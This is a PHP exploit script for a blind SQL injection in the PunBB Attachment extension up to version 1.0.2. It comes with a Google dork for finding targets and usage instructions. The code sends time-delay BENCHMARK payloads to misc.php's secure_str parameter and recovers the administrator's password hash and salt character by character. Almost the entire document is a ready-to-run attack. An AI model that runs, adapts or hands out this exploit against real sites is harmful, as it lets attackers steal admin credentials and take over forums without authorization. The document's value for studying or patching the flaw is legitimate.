#!/usr/bin/php
<?php

print_r('
+--------------------------------------------------------------------------
-+
Punbb Extension Attachment <= v1.0.2 Bind SQL injection exploit
by puret_t
mail: puretot at gmail dot com
team: http://www.wolvez.org
dork: "Powered by PunBB"
+--------------------------------------------------------------------------
-+
');
/**
* works regardless of php.ini settings
*/
if ($argc < 3) {
print_r('
+--------------------------------------------------------------------------
-+
Usage: php '.$argv[0].' host path
host: target server (ip/hostname)
path: path to punbb
Example:
php '.$argv[0].' localhost /punbb/
+--------------------------------------------------------------------------
-+
');
exit;
}

error_reporting(7);
ini_set('max_execution_time', 0);

$host = $argv[1];
$path = $argv[2];

$pre = 'pun_';

$benchmark = 200000000;
$timeout = 10;

echo "Plz Waiting...\nPassword:\n";
/**
* get pass
*/
$j = 1;
$pass = '';

$hash[0] = 0; //null
$hash = array_merge($hash, range(48, 57)); //numbers
$hash = array_merge($hash, range(97, 122)); //a-z letters

while (strlen($pass) < 40) {
for ($i = 0; $i <= 255; $i ++) {
if (in_array($i, $hash)) {
$cmd =
'1f1%27%20AND%20(IF((ASCII(SUBSTRING((SELECT%20password%20FROM%20'.$pre.'us
ers%20WHERE%20group_id=1%20LIMIT%201),'.$j.',1))='.$i.'),BENCHMARK('.$bench
mark.',CHAR(0)),1))%23';
send();
usleep(2000000);
$starttime = time();
send();
$endtime = time();
$difftime = $endtime - $starttime;
if ($difftime > $timeout) {
$pass .= chr($i);
echo chr($i);
break;
}
}
if ($i == 255)
exit("\nExploit Failed!\n");
}
$j ++;
}

echo "\nSalt:\n";
/**
* get salt
*/
$j = 1;
$salt = '';

$hash[0] = 0; //null
$hash = array_merge($hash, range(33, 126));

while (strlen($salt) < 12) {
for ($i = 0; $i <= 255; $i ++) {
if (in_array($i, $hash)) {
$cmd =
'1f1%27%20AND%20(IF((ASCII(SUBSTRING((SELECT%20salt%20FROM%20'.$pre.'users%
20WHERE%20group_id=1%20LIMIT%201),'.$j.',1))='.$i.'),BENCHMARK('.$benchmark
.',CHAR(0)),1))%23';
send();
usleep(2000000);
$starttime = time();
send();
$endtime = time();
$difftime = $endtime - $starttime;
if ($difftime > $timeout) {
$salt .= chr($i);
echo chr($i);
break;
}
}
if ($i == 255)
exit("\nExploit Failed!\n");
}
$j ++;
}

exit("\nExpoilt Success!\nPassword Hash:\t$pass\nSalt:\t$salt\n");

function send()
{
global $host, $path, $cmd;

$data = "GET ".$path."misc.php?item=1&secure_str=".$cmd."
HTTP/1.1\r\n";
$data .= "Host: $host\r\n";
$data .= "Connection: Close\r\n\r\n";

$fp = fsockopen($host, 80);
fputs($fp, $data);

$resp = '';

while ($fp && !feof($fp))
$resp .= fread($fp, 1024);

return $resp;
}

?>
